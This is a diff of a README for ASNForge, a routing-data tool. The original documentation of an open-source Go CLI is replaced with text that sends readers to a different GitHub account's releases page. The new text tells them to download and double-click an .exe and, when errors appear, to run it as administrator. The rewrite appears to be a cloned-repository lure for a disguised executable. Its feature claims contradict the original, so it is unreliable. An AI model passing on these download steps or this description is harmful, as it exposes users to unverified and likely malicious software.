@@ -1,432 +1,99 @@
-# ASNForge
+# 🌐 ASNforge - Simplify your internet routing data analysis
 
-ASNForge builds reproducible ASN and prefix-origin intelligence artifacts for IP enrichment, routing analytics, and security data pipelines. It compiles public registry and routing inputs into a compact IP-to-ASN MaxMind DB, canonical ASN tables, prefix-origin snapshots, build metadata, checksums, and release-ready archives.
+[![](https://img.shields.io/badge/Download-ASNforge-blue.svg)](https://github.com/irawany304-gif/ASNforge/releases)
 
-<p align="center">
-  <img src="./site/banner.png" alt="ASNForge routing and registry intelligence compiler" width="100%">
-</p>
+ASNforge turns complex internet routing data into clear information. This application helps you work with autonomous system numbers and prefix-origin data. You can use it to build security pipelines, analyze network paths, or enrich IP addresses.
 
-<p align="center">
-  <a href="https://github.com/ipanalytics/ASNforge/actions/workflows/ci.yml"><img alt="CI" src="https://img.shields.io/github/actions/workflow/status/ipanalytics/ASNforge/ci.yml?branch=main&label=ci"></a>
-  <a href="https://github.com/ipanalytics/ASNforge/releases"><img alt="Release" src="https://img.shields.io/github/v/release/ipanalytics/ASNforge?include_prereleases&label=release"></a>
-  <a href="./LICENSE"><img alt="License" src="https://img.shields.io/badge/license-Apache%202.0-blue"></a>
-  <img alt="Go" src="https://img.shields.io/badge/go-1.22%2B-00ADD8">
-  <img alt="Dataset" src="https://img.shields.io/badge/dataset-public--safe-success">
-  <a href="https://ipanalytics.github.io/ASNforge/"><img alt="GitHub Pages" src="https://img.shields.io/badge/pages-docs-brightgreen"></a>
-</p>
-
----
-
+## 📥 Getting Started
 
-<!-- ASNFORGE:RELEASE-STATS BEGIN -->
-## Latest Release Stats
-
-| Field | Value |
-| --- | ---: |
-| Build ID | `20260601-084533Z` |
-| Profile | `public-safe` |
-| Generated | `2026-06-01T08:45:33Z` |
-| Quality | `PASS` |
-| ASN profiles | 137,463 |
-| Named ASN profiles | 120,834 |
-| Prefixes | 1,452,874 |
-| MMDB inserted prefixes | 1,452,874 |
-| MOAS prefixes | 14,910 |
-| Private ASN records | 190 |
-| Reserved ASN records | 28 |
-| Unknown type ASNs | 123,396 |
-| Build duration seconds | 72.49 |
-
-## Sources
-
-| Name | URL | Size | SHA256 |
-| --- | --- | ---: | --- |
-| `afrinic` | [delegated-afrinic-extended-latest](https://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-extended-latest) | 977,034 | `803486734673` |
-| `apnic` | [delegated-apnic-extended-latest](https://ftp.apnic.net/stats/apnic/delegated-apnic-extended-latest) | 8,944,236 | `d56a9238f19e` |
-| `arin` | [delegated-arin-extended-latest](https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest) | 12,812,093 | `574167ab91d8` |
-| `lacnic` | [delegated-lacnic-extended-latest](https://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest) | 4,511,274 | `93bff56d3b20` |
-| `ripe` | [delegated-ripencc-extended-latest](https://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-extended-latest) | 17,867,133 | `a5b10205e4bc` |
-| `ed2d58969c8c-table.jsonl` | [table.jsonl](https://bgp.tools/table.jsonl) | 75,028,674 | `3502a6078c7c` |
-| `asn_catalog` | [asns.csv](https://bgp.tools/asns.csv) | 5,514,803 | `cdbaa34e0114` |
-| `asn_signals` | [asn-signals.csv](https://raw.githubusercontent.com/ipanalytics/IP-Knowledge-Layer/main/data/current/asn-signals.csv) | 119 | `f27bb5dba8a1` |
-| `asn_signals` | [asn-signals.csv](https://raw.githubusercontent.com/ipanalytics/ASN-Signal-Graph/main/data/current/asn-signals.csv) | 607,661 | `cb3b5545435e` |
-
-## Artifacts
-
-| Artifact | Size | Records |
-| --- | ---: | ---: |
-| `asnforge-asn.csv.gz` | 2,829,957 | 137,463 |
-| `asnforge-asn.jsonl.gz` | 3,581,556 | 137,463 |
-| `asnforge-diff.json` | 224 | - |
-| `asnforge-prefixes.csv.gz` | 8,922,542 | 1,452,874 |
-| `asnforge-prefixes.jsonl.gz` | 10,820,395 | 1,452,874 |
-| `asnforge.mmdb.gz` | 6,091,529 | 1,452,874 |
-| `manifest.json` | 3,719 | - |
-| `quality-report.md` | 2,664 | - |
-
-## Numeric Diff
-
-| Metric | Value |
-| --- | ---: |
-| `baseline` | true |
-| `new_asns` | 0 |
-| `removed_asns` | 0 |
-| `changed_asn_profiles` | 0 |
-| `new_prefixes` | 0 |
-| `removed_prefixes` | 0 |
-| `changed_prefix_origins` | 0 |
-| `new_moas_prefixes` | 0 |
-| `resolved_moas_prefixes` | 0 |
-
-## Quality
-
-No warnings or errors.
-<!-- ASNFORGE:RELEASE-STATS END -->
-
-
-
+You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
+1. Visit the [official releases page](https://github.com/irawany304-gif/ASNforge/releases) to access the latest version.
+2. Look for the file ending in .exe under the Assets section.
+3. Click the file to start the download.
+4. Save the file to a folder you can find easily, such as your Downloads folder.
+5. Double-click the downloaded file to begin the setup process.
+6. Follow the on-screen prompts to finish the installation.
 
-
-
-
-## Overview
-
-ASNForge is a local compiler for ASN profile and prefix-origin datasets. It is designed for teams that need deterministic, inspectable artifacts instead of ad hoc enrichment files assembled by scripts.
+## 🛠️ System Requirements
 
-The v0.1 pipeline ingests RIR delegated stats, bgp.tools prefix-origin and ASN catalog exports, static ipanalytics signal feeds, normalized local inputs, and curated overrides. It emits stable JSONL/CSV tables for analytics and joins, plus a compact MaxMind DB for latency-sensitive IP enrichment.
-
-The compiler records build identifiers, schema versions, source hashes, artifact hashes, quality results, and release manifests so generated data can be traced and compared across builds.
-
-## System Behavior
-
-```text
-RIR delegated stats     manual overrides
-        │                    │
-        ▼                    ▼
-   ASN allocation table ── ASN profile normalization
-        │                    │
-        │                    ▼
-BGP prefix-origin feed ── prefix-origin aggregation ── MOAS policy
-        │                    │
-        ├───────────────┬────┴───────────────┐
-        ▼               ▼                    ▼
-  ASN JSONL/CSV   Prefix JSONL/CSV       Compact MMDB
-  ASN -> profile  prefix -> origins      IP -> ASN profile
-```
-
-ASNForge produces three related artifact families:
-
-| Artifact | Access pattern | Role |
-| --- | --- | --- |
-| `asnforge.mmdb` | IP address -> origin ASN profile | Prefix-keyed MaxMind DB for local enrichment |
-| `asnforge-asn.jsonl` / `.csv` | ASN -> ASN profile | Canonical table for direct ASN lookup and joins |
-| `asnforge-prefixes.jsonl` / `.csv` | Prefix -> observed origin state | Prefix-origin snapshot with MOAS and collector state |
-
-## Features
-
-- RIR delegated extended parser for ASN allocation records.
-- Normalized BGP prefix-origin CSV/TSV parser with collector-aware aggregation.
-- bgp.tools bulk table parser for production prefix-origin snapshots.
-- bgp.tools ASN catalog parser for ASN names and coarse source classes.
-- Static ASN signal enrichment from IP-Knowledge-Layer and ASN-Signal-Graph.
-- Conservative name-based classification fallback for obvious ASN categories.
-- Manual ASN overrides for curated name, organization, type, tags, confidence, and field sources.
-- MOAS handling with deterministic policies: `mark_ambiguous`, `most_observed`, `lowest_asn`.
-- Private and reserved ASN handling with `flag`, `drop`, and `keep` policies.
-- Compact MaxMind DB writer for IP-prefix lookups.
-- Stable JSONL and CSV outputs with fixed headers and sorted records.
-- Build metadata with source hashes, artifact hashes, schema version, build id, and quality verdict.
-- Smoke tests, validation command, checksums, release manifest, and baseline diff output.
-- GitHub Actions CI and release workflow for scheduled or tag-driven artifact publication.
-
-## Quick Start
-
-The local development profile is deterministic and does not require network access.
-
-```sh
-go run ./cmd/asnforge build \
-  --config config/local-dev.yaml \
-  --out release/current \
-  --build-id local-dev
-
-go run ./cmd/asnforge validate --out release/current --strict
-```
-
-Inspect generated data:
-
-```sh
-go run ./cmd/asnforge inspect-ip 8.8.8.8 \
-  --mmdb release/current/asnforge.mmdb \
-  --format json
-
-go run ./cmd/asnforge inspect-asn 15169 \
-  --asn-table release/current/asnforge-asn.jsonl
-
-go run ./cmd/asnforge stats --out release/current --format json
-```
-
-## Installation
-
-Build from source:
-
-```sh
-git clone https://github.com/ipanalytics/ASNforge.git
-cd ASNforge
-go build -o asnforge ./cmd/asnforge
-```
-
-Run the compiler:
-
-```sh
-./asnforge build --config config/local-dev.yaml --out release/current
-./asnforge validate --out release/current --strict
-```
-
-Requirements:
-
-| Component | Version |
-| --- | --- |
-| Go | 1.22 or newer |
-| OS | Linux, macOS, or any environment supported by Go |
-| Network | Required only for configured HTTP source downloads |
-
-## CLI
-
-```text
-asnforge build
-asnforge download
-asnforge validate
-asnforge inspect-ip <ip>
-asnforge inspect-asn <asn>
-asnforge stats
-asnforge version
-```
-
-Common flags:
-
-| Flag | Default | Description |
-| --- | --- | --- |
-| `--config` | `config/public-safe.yaml` | Build configuration |
-| `--out` | `release/current` | Release output directory |
-| `--cache` | `data/cache` | Source cache directory |
-| `--build-id` | UTC timestamp | Explicit build identifier |
-| `--schema-version` | `asnforge.v0.1` | Artifact schema version |
-| `--private-asn-policy` | config value | `flag`, `drop`, or `keep` |
-| `--moas-policy` | config value | `mark_ambiguous`, `most_observed`, or `lowest_asn` |
-| `--mmdb` | `<out>/asnforge.mmdb` | MMDB path for build or inspect |
-| `--skip-download` | `false` | Use cached/local source files |
-| `--strict` | `false` | Treat quality warnings as build failures |
-| `--format` | `text` | `text` or `json` where supported |
-
-## Outputs
-
-A successful build writes a complete release directory:
-
-```text
-release/current/
-├── asnforge.mmdb
-├── asnforge.mmdb.gz
-├── asnforge-asn.jsonl
-├── asnforge-asn.jsonl.gz
-├── asnforge-asn.csv
-├── asnforge-asn.csv.gz
-├── asnforge-prefixes.jsonl
-├── asnforge-prefixes.jsonl.gz
-├── asnforge-prefixes.csv
-├── asnforge-prefixes.csv.gz
-├── metadata.json
-├── checksums.txt
-├── quality-report.md
-├── asnforge-diff.json
-└── manifest.json
-```
-
-| File | Description |
-| --- | --- |
-| `asnforge.mmdb` | Compact MaxMind DB for IP -> ASN profile lookup |
-| `asnforge-asn.jsonl` | Canonical ASN profile table |
-| `asnforge-asn.csv` | CSV form of the ASN profile table |
-| `asnforge-prefixes.jsonl` | Canonical prefix-origin snapshot |
-| `asnforge-prefixes.csv` | CSV form of prefix-origin state |
-| `metadata.json` | Build metadata, source hashes, artifact hashes, summary, quality verdict |
-| `checksums.txt` | SHA256 checksums for release artifacts |
-| `quality-report.md` | Human-readable build and quality report |
-| `asnforge-diff.json` | Baseline or release-to-release diff shape |
-| `manifest.json` | Machine-readable artifact manifest |
-
-## Data Formats
-
-Every primary record includes:
-
-- `schema_version`
-- `build_id`
-
-These fields make joins explicit and prevent accidental mixing of incompatible builds.
-
-### ASN Profile
-
-`asnforge-asn.jsonl` and `asnforge-asn.csv` contain one row per ASN:
-
-```json
-{
-  "schema_version": "asnforge.v0.1",
-  "build_id": "local-dev",
-  "asn": 15169,
-  "asn_name": "Google LLC",
-  "asn_org": "Google",
-  "asn_type": "cloud",
-  "asn_tags": ["cloud", "dns", "manual-override", "search"],
-  "registration_country": "US",
-  "rir": "arin",
-  "asn_confidence": 100
-}
-```
-
-`registration_country` is the registry allocation country from RIR delegated data. It is not user, host, or service geolocation.
-
-### Prefix Origin
-
-`asnforge-prefixes.jsonl` and `asnforge-prefixes.csv` preserve routing observation state:
-
-```json
-{
-  "prefix": "8.8.8.0/24",
-  "origin_asns": [15169],
-  "selected_origin_asn": 15169,
-  "moas": false,
-  "origin_policy": "most_observed",
-  "observation_count": 2,
-  "source_collectors": ["ris-rrc00", "routeviews2"],
-  "prefix_confidence": 90,
-  "rpki_state": "unknown"
-}
-```
-
-### MMDB Record
-
-The MMDB is prefix-keyed and optimized for local IP enrichment:
-
-```json
-{
-  "schema_version": "asnforge.v0.1",
-  "build_id": "local-dev",
-  "asn": 15169,
-  "asn_name": "Google LLC",
-  "asn_org": "Google",
-  "asn_type": "cloud",
-  "asn_tags": ["cloud", "dns", "manual-override", "search"],
-  "registration_country": "US",
-  "rir": "arin",
-  "moas": false,
-  "asn_confidence": 100
-}
-```
-
-Detailed MOAS state, origin arrays, collector observations, and field-level provenance belong in the prefix and ASN tables. Keeping those fields out of the MMDB preserves data-section deduplication and keeps the database compact.
-
-## Operational Notes
-
-- Builds are deterministic for the same inputs, config, schema version, and build id.
-- ASN rows are sorted by numeric ASN.
-- Prefix rows are sorted by IP family, address bytes, and prefix length.
-- CSV list fields use semicolon-separated stable ordering.
-- `metadata.json` records source paths, URLs, SHA256 hashes, sizes, generated time, artifact hashes, and quality summary.
-- `validate --strict` is intended for CI and release workflows.
-
-## Source Profiles
-
-| Profile | Purpose | Network required |
-| --- | --- | --- |
-| `config/local-dev.yaml` | Deterministic development and CI fixture build | No |
-| `config/public-safe.yaml` | Public-safe release profile using RIR delegated files, bgp.tools exports, and static ipanalytics ASN signal feeds | Yes |
-| `config/research-caida.yaml` | Public-safe sources plus optional CAIDA ASRank, AS2Org, and AS relationships bulk files | Yes, plus operator-provided CAIDA files |
-
-The public-safe profile downloads `https://bgp.tools/table.jsonl` for production prefix-origin input, `https://bgp.tools/asns.csv` for ASN names and source classes, and static raw CSV signal exports from IP-Knowledge-Layer and ASN-Signal-Graph. The deterministic fixture under `examples/testdata` is intentionally scoped to `config/local-dev.yaml`.
-
-The research CAIDA profile is separate because CAIDA datasets have their own acceptable-use, citation, and redistribution terms. CAIDA fields are written to the ASN JSONL/CSV artifacts and are intentionally excluded from the compact MMDB.
-
-Default CAIDA research inputs:
-
-| Dataset | File |
-| --- | --- |
-| AS2Org | `https://publicdata.caida.org/datasets/as-organizations/latest.as-org2info.txt.gz` |
-| AS relationships | Latest `*.as-rel2.txt.bz2` resolved from `https://publicdata.caida.org/datasets/as-relationships/serial-2/` |
-| ASRank | Operator-provided CSV path or URL; ASRank API crawling is not used |
-
-The repository includes a monthly/manual `release-caida` workflow that publishes a prerelease tagged `research-caida-YYYYMMDD-HHMMSSZ`.
-
-The v0.1 public-safe profile does not include CAIDA data by default. Optional PeeringDB, CAIDA, RPKI, and native MRT support are tracked as later source profiles and parser extensions.
-
-## Use Cases
-
-- IP enrichment in SIEM, fraud, abuse, and traffic analytics systems.
-- Local ASN profile joins in data warehouses and stream processors.
-- Prefix-origin snapshots for routing analytics and MOAS review.
-- Reproducible release artifacts for internal security data pipelines.
-- Build-time validation of third-party registry and routing source changes.
-
-## Scope
-
-ASNForge v0.1 focuses on the pipeline shape: parsers, normalized models, deterministic outputs, compact MMDB generation, metadata, validation, and release automation.
-
-Classification is conservative. `asn_type` is a scored operational classification, not an authoritative registry fact. Confidence describes source agreement, completeness, or observation strength; it is not a risk score.
-
-## Limitations
-
-- Native MRT parsing is not implemented in v0.1.
-- Prefix-origin input is normalized CSV/TSV.
-- RPKI state defaults to `unknown`.
-- ASN classification is intentionally sparse without optional enrichment sources.
-- Live routing data varies by collector and collection time.
-
-## Directory Structure
-
-```text
-.
-├── cmd/asnforge/          # CLI entry point
-├── internal/asn/          # ASN models, classification, private/reserved policy
-├── internal/bgp/          # Prefix-origin parser and aggregation
-├── internal/build/        # Build pipeline, metadata, quality, diff
-├── internal/config/       # Config loading and CLI options
-├── internal/download/     # Source download, hashing, source state
-├── internal/mmdb/         # MaxMind DB writer and inspector
-├── internal/output/       # JSONL, CSV, gzip, checksums
-├── internal/rir/          # RIR delegated parser
-├── internal/smoke/        # Smoke test runner
-├── config/                # Build profiles
-├── schemas/               # JSON Schemas
-├── examples/              # Overrides, smoke cases, deterministic testdata
-├── docs/                  # Data source and artifact documentation
-└── .github/workflows/     # CI and release automation
-```
-
-## Deployment
-
-Release artifacts are intended to be published through GitHub Releases, not committed to the repository.
-
-The release workflow builds the CLI, runs the configured public-safe build, validates the output, computes checksums, creates a release tag, and uploads compressed data artifacts plus metadata:
-
-```sh
-./asnforge build --config config/public-safe.yaml --out release/current
-./asnforge validate --out release/current --strict
-```
-
-For internal deployments, run the same commands in CI and publish `release/current/*` to object storage, package registries, or internal artifact repositories.
-
-## Documentation
-
-- [Data Sources](docs/DATA_SOURCES.md)
-- [Third-Party Data](docs/THIRD_PARTY_DATA.md)
-- [Classification](docs/CLASSIFICATION.md)
-- [MMDB Output](docs/MMDB_OUTPUT.md)
-- [Release Artifacts](docs/RELEASE_ARTIFACTS.md)
-- [Confidence](docs/CONFIDENCE.md)
-
-## License
-
-ASNForge is licensed under the [Apache License 2.0](LICENSE).
-
-## Disclaimer
-
-ASNForge aggregates registry and observed routing data for defensive, analytical, and operational use. Routing data is observational and may differ by collector and collection time.
+ASNforge works on most modern Windows systems. Ensure your computer meets these basic needs for the best experience:
+
+* Windows 10 or Windows 11.
+* A stable internet connection for downloading routing databases.
+* At least 500 megabytes of free storage space.
+* 4 gigabytes of memory or more.
+
+## 📊 Core Features
+
+ASNforge manages the heavy lifting for your network data needs. 
+
+* Automated data collection: The app fetches updates from trusted sources for you.
+* Format conversion: It turns raw routing tables into readable files.
+* Security enrichment: It links IP addresses to known threat intelligence data.
+* Routing analytics: You can track path changes and peering status.
+* Database support: It integrates seamlessly with MaxMind and CAIDA data formats.
+
+## ⚙️ How to Use the Application
+
+Once you open the software, you see a clean dashboard. Follow these steps to perform your first analysis:
+
+1. Open the File menu and select Import.
+2. Choose your input file containing the IP addresses or routing prefixes.
+3. Select your preferred output format.
+4. Click the Run button to start the processing task.
+5. View the progress bar on the main screen to track the status.
+6. Once the task ends, the app saves your file to your chosen output folder.
+
+## 🔍 Understanding the Data
+
+The app provides information based on standard internet registry data. You will see several columns in your output files:
+
+* ASN: The unique number assigned to your routing destination.
+* Prefix: The range of IP addresses being analyzed.
+* Origin: The registered entity responsible for the prefix.
+* Reputation: A score indicating if the source is known for safe or malicious activity.
+* Geography: The physical region associated with the network provider.
+
+## 🛡️ Security and Privacy
+
+ASNforge processes your data locally on your machine. The application does not send your private lists to external servers for processing. Only the specific routing databases download from the internet when you trigger an update. This design keeps your security workflows private and your data within your own network environment.
+
+## 💡 Managing Updates
+
+Data in the networking world changes every day. ASNforge helps you keep your intelligence fresh.
+
+1. Navigate to the Settings menu.
+2. Select the Updates tab.
+3. Toggle the Automatic Updates switch to the On position.
+4. The software checks for new database signatures every time you launch it.
+5. If the application detects a newer version of the software itself, it alerts you with a notification window.
+
+## 🎓 Common Questions
+
+**Does the software require a subscription?**
+No, ASNforge is free to use for all users.
+
+**Can I run the software offline?**
+You may process data while offline if you have already downloaded the necessary mapping databases. However, you need an internet connection to fetch the latest routing data updates.
+
+**Where does the project get its data?**
+The tool pulls information from public regional internet registries, CAIDA, and MaxMind. 
+
+**Is this tool suitable for large datasets?**
+Yes, the internal processing engine handles lists containing millions of entries if your computer has enough memory.
+
+## 🏗️ Technical Workflow
+
+The application acts as a compiler for diverse network datasets. It standardizes data formats so that you do not have to clean them manually. 
+
+1. Input ingestion: The tool reads CSV, TXT, or JSON files.
+2. Parsing engine: It maps input entries against the internal routing registry.
+3. Intelligence layering: It overlays security and ownership information to the base list.
+4. Export: The application generates a final report in your desired format.
+
+## 🔧 Troubleshooting
+
+If the application fails to start, verify your Windows version. Ensure you provide the software with permissions to write files to your chosen output folder. If a specific task hangs, restart the application and check your local storage space. Most issues stem from incomplete database downloads, which you can fix by running the update sequence again from the Settings menu. 
+
+Keep your workspace organized by placing your input files in a dedicated folder before you import them into the software. This habit prevents confusion during bulk processing tasks. If you see errors related to file access, try running the application as an administrator.
